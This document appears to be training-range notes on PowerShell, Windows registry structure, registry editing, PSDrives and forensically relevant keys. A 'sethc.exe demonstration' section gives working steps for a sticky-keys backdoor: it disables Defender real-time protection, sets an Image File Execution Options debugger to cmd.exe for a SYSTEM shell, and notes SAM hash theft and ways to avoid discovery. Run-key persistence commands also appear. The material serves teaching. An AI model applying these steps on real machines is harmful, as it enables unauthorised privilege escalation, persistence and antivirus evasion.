# Range 
Details about the range itself are below

## Range Map
![range-photo](../../0-src/Range_Diagram.PNG)

## Range IPs
| Host | IP Address |
|---|---|
| Admin Station | 10.10.0.2 |
| fileServer | 10.10.0.3 |
| dc | 10.10.0.10 |
| workstation2 | 10.10.0.4|
| workstation1 | 10.10.0.5 |
| terra | 10.10.0.6 |
| minas | 10.10.0.7 |

### PowerShell Commands and Arguments
```
Get-Content -Path "C:\Test Files\content.txt"                                         # Displays the contents of the file
Get-Variable                                                                          # Displays current Variables
Get-Verb                                                                              # List the PowerShell verbs
Get-Command                                                                           # List the PowerShell cmdlets
Get-Command -Type Cmdlet | Sort-Object -Property Noun | Format-Table -GroupBy Noun    # Get cmdlets and display them in order
Get-Command -Module Microsoft.PowerShell.Security, Microsoft.PowerShell.Utility       # Get commands in a module
```
### PowerShell Help
```
Get-Help <cmdlet>                                                 # Displays help about a PowerShell cmdlet
Get-Help get-process                                              # Displays help for Get-Process cmdlet
Get-Help get-process -online                                      # Opens a web browser and displays help for the Get-Process cmdlet on the Microsoft website
Get-History <like Linux will return previous entered commands.>   # Displays history of commands in current window
Get-Location <similar to PWD on Linux, gl is the alias.>          # Displays present working directory
```
### PowerShell Object Properties
```
Get-Process | Get-Member                       # Gives the methods and properties of the object/cmdlet
(cmdlet).property                              # Command Structure
(Get-Process).Name                             # Returns the single property of 'name' of every process
Start-Process Notepad.exe                      # This cmdlet uses the Process.Start Method of the System.Diagnostics.Process class to open notepad.exe
Stop-Process -name notepad                           # This cmdlet uses the Process.Kill Method of the System.Diagnostics.Process class to stop notepad.exe
Get-Process | Select-Object Name, ID, path     # Displays the Get-Process Properties of 'Name, ID, Path' for every process
Get-Help Format-Table
Get-Help Format-List
```
### Pipelined Variables
```
Get-Process | Select-Object Name, ID, path | Where-object {$_.ID -lt '1000'}            # List all the processes with a PID lower than 1000
(Get-Process | Select-Object Name, ID, path | Where-object {$_.ID -lt '1000'}).count    # List all the processes with a PID lower than 1000
```

### CIM Classes
```
Get-Cimclass *                                                                  # Lists all CIM Classes
Get-CimInstance –Namespace root\securitycenter2 –ClassName antispywareproduct   # Lists the antispywareproduct class from the root/security instance
Get-CimInstance -ClassName Win32_LogicalDisk -Filter “DriveType=3” | gm         # Shows properties and methods for this Instance
Get-WmiObject -Class Win32_LogicalDisk -Filter “DriveType=3”                    # Using the Windows Management Instrumentation method
Get-CimInstance -class Win32_BIOS                      # Queries Win32_Bios
Get-WmiObject -Class Win32_BIOS                        # same output but deprecated command
```

### PowerShell Scripts

#### PowerShell Loops
```
Get-Help about_For
Get-Help about_Foreach
Get-Help about_While
Get-Help about_Do
```
##### For Loops
```
for (<Init>; <Condition>; <Repeat>)
{
    <Statement list>
}

$array = ("item1", "item2", "item3")
for($i = 0; $i -lt $array.length; $i++){ $array[$i] }
item1
item2
item3
```
##### Foreach Loop
```
$letterArray = "a","b","c","d"
foreach ($letter in $letterArray)
{
  Write-Host $letter
}

foreach ($file in Get-ChildItem)
{
  Write-Host $file
}
```

##### While Loop
```
while (<condition>){<statement list>}

while($val -ne 3)
{
    $val++
    Write-Host $val
}
#or
while($val -ne 3){$val++; Write-Host $val}
```

#### Conditions
```
if ($a -gt 2) {
    Write-Host "The value $a is greater than 2."
}
elseif ($a -eq 2) {
    Write-Host "The value $a is equal to 2."
}
else {
    Write-Host ("The value $a is less than 2 or" +
        " was not created or initialized.")
}
```

#### Variables
```
Get-Variable                      # Names are displayed without the preceding <$>
Clear-Variable -Name MyVariable   # Delete the value of a Variable
Remove-Variable -Name MyVariable  # Delete the Variable

$MyVariable = 1, 2, 3             # Creates the MyVariable with 1,2,3

$Processes = Get-Process          # Creates a Variable with the results of Get-Process
$Today = (Get-Date).DateTime      # Creates a combined Date/Time variable from the results of Get-Date

$PSHome | Get-Member              # Displays System.String with it's objects and properties
$A=12                             # Creating A with an integer
$A | Get-Member                   # Displays System.Int32
```

#### Arrays
```
# Creating an Array

$A = 22,5,10,8,12,9,80

# Calling the Array

C:\PS> Echo $A
22
5
10
8
12
9
80

# Creating an Array with '..'

$A[1..4]
C:\PS> Echo $A
1
2
3
4

# ForEach loop to display the elements in the $A array

$A = 0..9
foreach ($element in $A) {
  $element
}
#output
0
1
2
3
4
5
6
7
8
9

# For loop to return every other value in an array

$A = 0..9
for ($i = 0; $i -le ($a.length - 1); $i += 2) {
  $A[$i]
}
#output
0
2
4
6
8

# While loop to display the elements in an array until a defined condition is no longer true

$A = 0..9
$i=0
while($i -lt 4) {
  $A[$i];
  $i++
}
#output
0
1
2
3
```

# Windows Registry
    - [The Windows Registry](https://docs.microsoft.com/en-us/windows/win32/sysinfo/registry) is a central hierarchical database used in Windows to store information that is necessary to configure the system for one or more users, applications, and hardware devices.

   - Think of the Windows Registry like a huge [Rolodex](https://en.wikipedia.org/wiki/Rolodex).

       - everything in Windows has a card/place with all of it’s information.

       - Includes location, information, settings, options, and other values for programs and hardware installed

Why is the registry important?

   - Anyone can hide all sorts of data including passwords, malicious code, and executable/binary files in the Registry.

   - They can effectively hide data in registry keys’ value entries.

   - By using different encoding techniques, they could obfuscate or hide data from forensic examiners.

   - It is important to know what right looks like and the places that are most likely to be compromised by a malicious actor.

Comparing the Registry in Windows to Linux

   - The registry in Windows is like a combination of multiple directories in Linux.

       - For example: Driver information is kept in the registry in Windows, but in `/dev` in Linux.

       - System configurations in Windows are in `HKEY_LOCAL_MACHINE`, but in `/etc` (and a few other directories) in Linux.

```
HKEY_Local_Machine (HIVE)
              ├──SOFTWARE (Key)
              ├──BCD00000 (Key)
              ├──HARDWARE (Key)
              └──SYSTEM   (Key)
                      └──RegisteredApplications (Subkey)
                                        ├── File Explorer : Data (value)
                                        ├── Paint : Data (value)
                                        └──Wordpad : Data (value)
```

[Structure of the Registry](https://docs.microsoft.com/en-us/windows/win32/sysinfo/structure-of-the-registry)

## Registry Hives or Root Keys
A registry hive is a group of keys and thier associated values that are loaded when the system is started or a specific user logs in.

There are five [Registry Hives](https://docs.microsoft.com/en-us/windows/win32/sysinfo/registry-hives)

   1. HKEY_LOCAL_MACHINE

   2. HKEY_USERS

   3. HKEY_CURRENT_USER

   4. HKEY_CURRENT_CONFIG

   5. HKEY_CLASSES_ROOT

### HKEY_LOCAL_MACHINE (HKLM)

Contains configuration information for the entire computer. Its values are read every time the machine is started regardless of the user who logs in. Its subkeys are :

   - **HARDWARE** - contains a database of installed devices along with their drivers

   - **SAM** - Security Account Manager stores user and group accounts along with NTLM hashes of passwords

   - **Security** - Local Security policy accessed by lsass.exe used to determine rights and permissions for users on the machine

   - **System** - Contains keys pertaining to system startup such as programs started on boot or driver load order.

[Reference for HKEY_LOCAL_MACHINE](https://flylib.com/books/en/1.532.1.45/1/)

### HKEY_USERS (HKU)

Contains all all user profiles on the system. Contains one key per user on the system. Each key is named after the **SID**(Security Identifier) of the user.

HKEY_USERS contains some of the following information:

   - User Environment settings for the desktop

   - Shortcuts

   - File associations

A SID has four components:

**SID = S-1-5-21-2948704478-3101701159-1111693228-1002**

   - **S** represents SID

   - **1** revision level (1) - Indicates the version of the SID structure that’s used in a particular SID.

   - An **identifier authority** (5, NT Authority) - Identifier Authority: This is a series of digits that identifies the entity that issued the SID. In the case of Active Directory, the identifier authority is always "5" for the Security IDentifier Authority (SID Authority).

   - A **domain identifier** 21-2948704478-3101701159-1111693228 (48 bit (6 byte) numbers)

       - Some **HKEY_USERS** are called [Well Known SIDs](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/security-identifiers-in-windows).. They identify default accounts in Windows used for various purposes. In this example the `21` represents the subauthority within the domain identifier. Examples include:

           - S-1-5-`18` refers to LocalSystem account.

           - S-1-5-`19` refers to LocalService account. It is used to run local services that do not require LocalSystem account.

           - S-1-5-`20` refers to NetworkService account. It is used to run network services that do not require LocalSystem account.

           - S-1-5-`21`-domain-500 Refers to the built in local administrator account.

   - -1002 = **RID A** variable number of subauthority or relative identifier (RID) values that uniquely identify the trustee relative to the authority that issued the SID

### HKEY_CURRENT_USER (HKCU)

**HKEY_CURRENT_USER** is a copy/dynamic link of the logged in user’s registry key based on thier SID from **HKEY_USERS**.
```
HKEY_USERS (HIVE)
              └──SID (S-1-5-21-3939661428-3032410992-3449649886-XXXX) (Key)
```
   - `HKEY_USERS\S-1-5-21-3939661428-3032410992-3449649886-XXXX`


### HKEY_CURRENT_CONFIG (HKCC)

**HKEY_CURRENT_CONFIG** is a copy/dynamic link to the following registry key:
```
HKEY_Local_Machine (HIVE)
              └──SYSTEM (Key)
                      └──CurrentControlSet (Subkey)
                                    └── Hardware Profiles (Subkey)
                                                └── Current (Subkey)
```
   - `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Hardware Profiles\Current`

### HKEY_CLASSES_ROOT (HKCR)

**HKEY_CLASSES_ROOT** is a copy/dynamic link to the following registry key:
```
HKEY_Local_Machine (HIVE)
              └──Software (Key)
                      └──Classes (Subkey)
```
   - `HKEY_LOCAL_MACHINE\Software\Classes`

Contains file name extension associations and COM class registration information such as ProgIDs, CLSIDs, and IIDs.

It is primarily intended for compatibility with the registry in 16-bit Windows

[HKCR Reference](https://docs.microsoft.com/en-us/windows/win32/sysinfo/hkey-classes-root-key)

## Registry Structure and Data Types

| Registry Path Hive | Supporting Files |
|---|---|
|HKLM\SAM | SAM, SAM.LOG|
|HKLM\SECURITY | SECURITY, SECURITY.LOG|
|HKLM\SOFTWARE | software, software.LOG, software.sav|
|HKLM\SYSTEM | system, system.LOG, system.sav|
|HKLM\HARDWARE | (Dynamic/Volatile Hive)|
|HKU\.DEFAULT | default, default.LOG, default.sav|
|HKU\SID | NTUSER.DAT|
|HKU\SID_CLASSES | UsrClass.dat, UsrClass.dat.LOG|

   - The above Table shows the registry path and their corresponding hives on disk.

       - All hives in HKLM are stored in %SYSTEMROOT%\System32\config\ (%SYSTEMROOT% usually refers to C:\WINDOWS).

       - HKLM\HARDWARE is a dynamic hive that is created each time the system boots and it is created and managed entirely in memory.

       - HKU\SID hive file is stored in user home directory, which is %USERPROFILE%\NTUSER.DAT.

       - HKU\SID_CLASSES hive file correspond to "%USERPROFILE%\Application Data\Local\Microsoft\Windows\UsrClass.dat"

|Extension|Definition|
|---|---|
|No extension | Actual Hive File|
|.alt extension | Backup copy of hive, used in Windows 2000|
|.log extension | Transaction log of changes to a hive|
|.sav extension | Backup copy of hive created at the end of text-mode (console)|

## Registry Manipulation
View/manipulate the registry with a GUI

   - **regedit.exe**
       - GUI
       - Located at C:\Windows\regedit.exe
       - Can connect to a remote registry, but only using the PC’s workgroup or domain Name
           - Needs the RemoteRegistry Service (svchost.exe / regsvc.dll) to be running to work
       - Commonly disabled using group policy
       - Can load hives files from disk to the active registry
       - Can export binary .hiv files as well as text .reg files
       - Can only query HKLM and HKU remotely

### Using Regedit.exe to query the Registry
1.	Click on the search bar and type in regedit.exe
2.	If prompted by UAC, click yes
3. 	Click on the drop down for HKEY_CURRENT_USER
4. 	Click the drop down for Software
5.	Click the drop down for Microsoft
6.	Click the drop down for Windows
7.	Click the drop down for CurrentVersion
8.	Click the drop down for Run
9.	We have successfully queried a key using regedit.exe

### View/manipulate the registry via CMDLINE
   - reg.exe
       - CLI
       - Located at C:\Windows\System32\reg.exe
       - Can connect to a remote registry, using the PC’s NetBios Name or IP address
           - Does not have to be in workgroup/domain. Only need username/password
           - Needs the RemoteRegistry Service (svchost.exe / regsvc.dll) to be running to work
       - Can load hives files from disk to the active registry
       - Available in XP and beyond
       - Can only export text .reg files
       - Can only query HKLM and HKU remotely

[Reg.exe Syntax](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/reg)

[More Reg.exe Syntax](https://ss64.com/nt/reg.html)
```
reg /?                    #Displays help for all of the reg.exe commands
reg query /?              #Displays help for the `reg query`
reg add /?                #Displays help for `reg add`
reg delete /?             #Displays help for `reg delete`
```
```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```
```
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v testme /t REG_SZ /d C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
```
   - The `/v` stands for Value; In this case the name of this Key Value.

   - The `/t` stands for Type; Types can be any of the Data Types that we went over earlier.

   - The `/d` stands for Data; Is what is the actual Data or in this case a command to open a file every time the system is ran.
```
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v testme
```
### Registry Manipulation with PowerShell
   - Certain Root Hives are loaded automatically into PSDrives (HKLM: and HKCU:); navigation of the registry is very similar to folder⇒file

**Minimum commands to know**
   - Query

       - **Get-ChildItem** cmdlet gets the items in one or more specified locations.

       - **Get-ItemProperty** cmdlet gets the items in one or more specified locations.

       - **Get-Item** cmdlet gets the item at the specified location. It doesn’t get the contents of the item at the location unless you use a wildcard character (`*`) to request all the contents of the item.

   - Modify

       - **Set-ItemProperty** cmdlet changes the value of the property of the specified item. example, changing setting to :true or :false.

       - **Remove-ItemProperty** cmdlet to delete registry values and the data that they store.

   - Create

       - **New-Item** cmdlet creates a new item and sets its value. In the registry, New-Item creates registry keys and entries.

       - **New-Itemproperty** cmdlet creates a new property for a specified item and sets its value. Typically, this cmdlet is used to create new registry values, because registry values are properties of a registry key item.

### Reading Registry Objects with PowerShell
```
Get-ChildItem HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run 

Get-ChildItem HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\ 
```
   - The returns nothing because it is listing the sub keys of \Run.

   - Run has no sub keys, only values.

   - Returns sub keys of \CurrentVersion
```
Get-item HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```
   - Notice how the output of the command is different than Get-ChildItem.
       - It reads key values, not sub keys.

### Creating Registry objects with Powershell
```
New-Item "HKLM:\Software\Microsoft\Office\14.0\Security\Trusted Documents\TrustRecords" -Force
```
   - Creates a new sub key in Trusted Documents for document.doc
```
New-ItemProperty "HKLM:\Software\Microsoft\Office\14.0\Security\Trusted Documents\TrustRecords" -Name "%USERPROFILE%Downloads/test-document.doc" -PropertyType Binary -Value ([byte[]](0x30,0x31,0xFF)) 

New-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name Token -PropertyType String -Value C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe 
```
    - Creates a new value in the \TrustRecords key
    - Creates a value in the \Run key

### Modifying Registry objects with PowerShell
```
Rename-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name SecurityHealth -NewName Test
```
```
Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Office\14.0\Security\Trusted Documents\TrustRecords" -Name "%USERPROFILE%Downloads/test-document.doc"
```
```
Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name Test -Value Bacon.exe
```

### Sethc.exe Demonstration

   - Demo: Demonstrate the application of a registry "tweak" via the GUI and CMD-line using [sethc.exe](https://hackernoon.com/-windows-sticky-keys-exploit-the-war-veteran-that-never-dies-its-very-likely-that-youve-heard-8ei2duh).

   - What is `sethc.exe`?

       - Windows contains a feature called stick keys, which is an accessibility feature to help Windows users who have physical disabilities.

           - It essentially serializes keystrokes instead of pressing multiple keys at a time, so it allows the user to press and release a modifier key, such as Shift, Ctrl, Alt, or the Windows key, and have it remain active until any other key is pressed.

           - You activate stick keys by pressing the Shift key 5 times. When you activate stick keys, you are launching a file, C:\Windows\System32\sethc.exe, which executes as SYSTEM.

       - While this exploit is protected by current AV, you still might see it in customer networks who don’t follow DISA STIGs.
	
**Create a new Registry key using PowerShell** 
This will create a backdoor onto a box which will trigger Windows Defender. So first we need to disable it.

**Disable Windows Defender Real Time Protection**
```
Set-MpPreference -DisableRealtimeMonitoring $TRUE
```

Sometimes, the previous command may not work as expected. In such cases, you can follow these steps:
1.	Click the Windows button in the lower-left corner of your desktop.
2.	Navigate to "Virus & threat protection."
3.	Under "Virus & threat protection settings," click "Manage settings."
4.	Finally, toggle off "Real-Time protection." These steps will help you turn off real-time protection using the Windows Security interface.

**Create a new Registry key using New-Item in PowerShell**
```
new-item "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"
```
**Create a new Registry key property using New-ItemProperty in PowerShell**
```
New-ItemProperty -path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" -Name Debugger -Type String -Value C:\Windows\System32\cmd.exe
```
**Calling our new value in order to privilege escalate**
    1. Rapidly press the SHIFT key 5 times
    2. A command shell opens
    3. Type whoami
    4. You should be army\john.huntsman or whoever your user account is
    5. Now log off the system and press the SHIFT key 5 times
    6. A command shell opens
    7. Type whoami
    8. Now you are NT AUTHORITY\SYSTEM

	As SYSTEM user, we could open the Registry and copy the SAM database to access password hashes

**Create a network share to Sysinternals**
```
net use * http://live.sysinternals.com
```
    The `net use` command allows us to map a network location and navigate it like it is a local directory.

    You can run `net use` and it will show detailed information about currently mapped drives and devices.

        Additionally you can run `net use /help` for a listing of most common parameters.
```
Type *autoruns -accepteula*
```
	- If we are running remote operations on a target, if we run a SysInternals command for the first time, we will be prompted by a popup to accept the EULA. The -accepteula switch will prevent this and prevent us from being discovered.
**Using Autoruns to view the created Registry key**
	1. In Autoruns, click on the Image Hijacks Button
	2. Right click on the sethc.exe and select Jump to Entry…​
	3. Right click on the sethc.exe key and select export
	4. Name the file "Totally Legit Windows Update" and save it to your Desktop
	5. Delete the sethc.exe key using the GUI

## PSDrives

**What is a PowerShell PSDrive?**

   - A Windows PowerShell drive is a data store location that you can access like a file system drive in Windows PowerShell.

        You cannot access them by using other Windows tools, such as File Explorer or Cmd.exe.

   - Basically, a [PSDrive](https://docs.microsoft.com/en-us/powershell/scripting/samples/managing-windows-powershell-drives?view=powershell-7.1) creates a temporary or permanent way for PowerShell to navigate the registry just like you could navigate the file system.

   - Another way to create/use a remote connection is to use PSDrive (PowerShell Drive).

   - A group of providers connect different forms of storage to PowerShell and make them look like and perform like a file system.

**Finding current PSDrives**
```
Get-PSDrive
```
   - To create a new Windows PowerShell drive, you must supply three parameters:

   - A **Name** for the drive (you can use any valid Windows PowerShell name)

   - The **PSProvider** (use "FileSystem" for file system locations, "Registry" for registry locations, and it could also be a shared folder on a remote server.)

   - The **Root**, that is, the path to the root of the new drive.

|PSDrive Providers|
|---|
|[Providers](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_providers?view=powershell-7.1): "Registry" - for registry locations, "FileSystem" for file system locations|
|[Certificate](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/about/about_certificate_provider?view=powershell-7.1): for any installed digital certificates|
|[Alias](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_alias_provider?view=powershell-7.1): for aliases used by PowerShell|
|[Function](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_function_provider?view=powershell-7.1): Provides access to the functions defined in PowerShell|
|[Variable](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_variable_provider?view=powershell-7.1): supports the variables that PowerShell creates, including the automatic variables, the preference variables, and the variables that you create.|
|[WSMAN](https://docs.microsoft.com/en-us/powershell/module/microsoft.wsman.management/about/about_wsman_provider?view=powershell-7.1): (Web Services Manager)lets you add, change, clear, and delete WS-Management configuration data on local or remote computers.|
|[Environment](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_environment_provider?view=powershell-7.1): Provides access to the Windows environment variable.|

**Show all Environmental Variables in the Env: directory**
```
Get-ChildItem Env:
```
**Show all Environmental Variables in the GUI**
-	Control Panel > System > click on Advanced system settings.
-	Then click on Environmental Variables.
-	The results should be the same as GCI ENV.

**Make a directory for our demo**
```
mkdir demo
```
**Creating a PSDrive**
```
New-PSDrive -Name Demo -PSProvider FileSystem -Root c:\Demo   #Review command: Get-Help New-PSDrive for this syntax.
```
**Show the difference from changing directory to C:\Demo and Demo:**
```
cd C:\Demo
cd Demo:
```
**Creating an invalid PSDrive**
```
New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USER
```
-	This will create an error. Try and mount the new drive and watch it error out. PowerShell will allow you to create a directory with a Root location that doesn’t exist.

**Mounting invalid PSDrive**
```
gci HKU:
Get-ChildItem HKU:
```
**Delete the bad PSDrive**
```
Remove-PSDrive HKU
```
**Now create the drive correctly**
```
New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS
```
**Changing directories with PowerShell**
```
cd Registry::HKEY_LOCAL_MACHINE 
cd HKU: 
C: 
```

## Forensically Relevant Keys

   - These are keys that hold any type of information that can be used to gather intelligence or track events.

   - These are some but not all of the keys that can be considered relevant to you or your mission set.

   - [SANS Registry Cheat Sheet](https://www.13cubed.com/downloads/dfir_cheat_sheet.pdf)

Why do we care?

   - We are looking for keys that can be used for Persistence

       - Persistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access

   - As well as Privilege Escalation.

       - Privilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network.


**Microsoft Edge Internet URL history and [Browser Artifacts and Forensics](https://www.digitalforensics.com/blog/an-overview-of-web-browser-forensics/)**

   - `HKEY_CLASSES_ROOT\Local Settings\Software\Microsoft\Windows\CurrentVersion\AppContainer\Storage\microsoft.microsoftedge_8wekyb3d8bbwe\Children\001\Internet Explorer\DOMStorage`


**USB history / USB Forensics**

   - `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USB`

       - This registry key contains information about all USB devices that have been connected to the system at some point, regardless of whether they are currently connected or not. It includes information about the USB controllers, hubs, and individual devices. Each device is typically identified by a unique identifier (like a device instance path or hardware ID).

   - `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`

       - This registry key specifically deals with USB storage devices, such as USB flash drives, external hard drives, etc. It contains information about connected USB storage devices, including details like device instance paths, hardware IDs, and other configuration information.


**Recent MRU history / [MRU in forensics](https://www.sans.org/blog/opensavemru-and-lastvisitedmru/)**

   - `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePidlMRU`

       - MRU is the abbreviation for most-recently-used.

       - This key maintains a list of recently opened or saved files via typical Windows Explorer-style common dialog boxes (i.e. Open dialog box and Save dialog box).

       - For instance, files (e.g. .txt, .pdf, htm, .jpg) that are recently opened or saved files from within a web browser (including IE and Firefox) are maintained.

**Recent Files [with LNK files](https://ismailtasdelen.medium.com/windows-lnk-file-analysis-in-forensic-it-reviews-75b3dfd49f36#:~:text=The%20concept%20of%20Recent%20Files,importance%20in%20the%20event%20resolution)**

   - `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs`

**Windows User Profiles [User Account Forensics](https://sechub.medium.com/blue-team-system-live-analysis-part-7-windows-user-account-forensics-categorization-and-87f94d131c1e)**

`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList`

**Saved Network Profiles and [How to decode Network history](https://hatsoffsecurity.com/2014/05/23/network-history-and-decoding-system-time/)**

`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles`

**Windows Virtual Memory [and why it is important](https://azurecloudai.blog/2020/03/03/side-channel-attack-mitigation-via-gpo/)**

`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management`

   - This key maintains Windows virtual memory (paging file) configuration.

   - The paging file (usually C:\pagefile.sys) may contain evidence/important information that could be removed once the suspect computer is shutdown.

**Recent search terms using Windows default search and Cortana**

   - `HKEY_CURRENT_USER\Software\Microsoft\Windows Search\ProcessedSearchRoots`

       - [Index of Search results by SID](https://docs.microsoft.com/en-us/windows/win32/search/-search-3x-wds-extidx-csm-searchroots)

   - `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Search`

       - [Recent files searched](https://df-stream.com/2017/10/recentapps/)

### Registry locations that can be utilized for persistence

[Persistence According to MITRE](https://attack.mitre.org/tactics/TA0003/#:~:text=Persistence%20consists%20of%20techniques%20that,could%20cut%20off%20their%20access)

[Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder - MITRE](https://attack.mitre.org/techniques/T1547/001/)

|System-wide and per-user autoruns|
|`HKLM\Software\Microsoft\Windows\CurrentVersion\Run`|
|`HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`|
|`HKU\<SID>\Software\Microsoft\Windows\CurrentVersion\Run`|
|`HKU\<SID>\Software\Microsoft\Windows\CurrentVersion\RunOnce`|
|`HKLM\SYSTEM\CurrentControlSet\services`|
|`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`|
|`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`|
|`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`|

### ritical Registry Locations

These are keys that have value for red and blue teams to be taken advantage of.

   - HKLM\BCD00000000

       - Replacement of old boot.ini file

   - HKLM\SAM\SAM

       - Use "psexec -s -i regedit" from administrator cmd.exe to view the SAM
           - It opens a new regedit.exe window with system permissions
            	PSEXEC is a SYSINTERNALS tool.

   - HKU\<SID>\Software\Policies\Microsoft\Windows\System\Scripts

       - Group policy Logon/Logoff Scripts defined here

